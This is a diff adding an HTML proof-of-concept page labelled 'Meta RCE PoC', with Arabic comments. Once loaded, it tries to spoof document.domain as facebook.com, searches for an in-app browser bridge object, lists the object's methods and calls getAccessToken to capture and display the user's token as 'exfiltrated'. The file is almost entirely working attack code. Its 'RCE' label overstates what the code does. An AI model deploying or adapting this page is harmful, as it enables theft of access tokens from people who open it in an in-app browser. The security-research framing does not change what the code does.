@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="no-referrer">
+    <script>
+        // محاولة تخطي فحص النطاق الأولي
+        try {
+            Object.defineProperty(document, 'domain', {value: 'facebook.com'});
+        } catch(e) { console.log("Domain override failed"); }
+    </script>
+    <title>Meta RCE PoC - Security Research</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .log { border: 1px solid #333; padding: 10px; margin-top: 20px; background: #000; overflow-x: auto; }
+        .success { color: #fff; background: #008000; padding: 2px 5px; }
+    </style>
+</head>
+<body>
+    <h1>[!] Meta Internal Bridge Scanner</h1>
+    <div id="status">Scanning for iabjs_unified_bridge...</div>
+    <div class="log" id="output"></div>
+
+    <script>
+        var output = document.getElementById('output');
+        var status = document.getElementById('status');
+
+        function log(msg) {
+            output.innerHTML += "> " + msg + "<br>";
+            console.log(msg);
+        }
+
+        function startExploit() {
+            log("Starting discovery phase...");
+
+            // 1. التحقق من وجود الجسر (Vector 1)
+            if (window.iabjs_unified_bridge) {
+                status.innerHTML = "<span class='success'>BRIDGE ACTIVE</span>";
+                log("[+] FOUND: iabjs_unified_bridge");
+
+                // 2. استخراج الدوال (Reflection) كما في PoC المخطط له
+                try {
+                    var proto = Object.getPrototypeOf(window.iabjs_unified_bridge);
+                    var methods = Object.getOwnPropertyNames(proto);
+                    log("[*] Available Methods: " + methods.join(", "));
+                    
+                    // 3. محاولة سحب البيانات الحساسة (RCE Sink)
+                    if (window.iabjs_unified_bridge.getAccessToken) {
+                        window.iabjs_unified_bridge.getAccessToken(function(token) {
+                            log("🚨 EXFILTRATED TOKEN: " + token);
+                        });
+                    }
+                } catch(e) {
+                    log("[-] Error during reflection: " + e.message);
+                }
+            } else {
+                log("[-] Bridge not detected. Retrying in 1s...");
+                setTimeout(startExploit, 1000);
+            }
+        }
+
+        window.onload = startExploit;
+    </script>
+</body>
+</html>
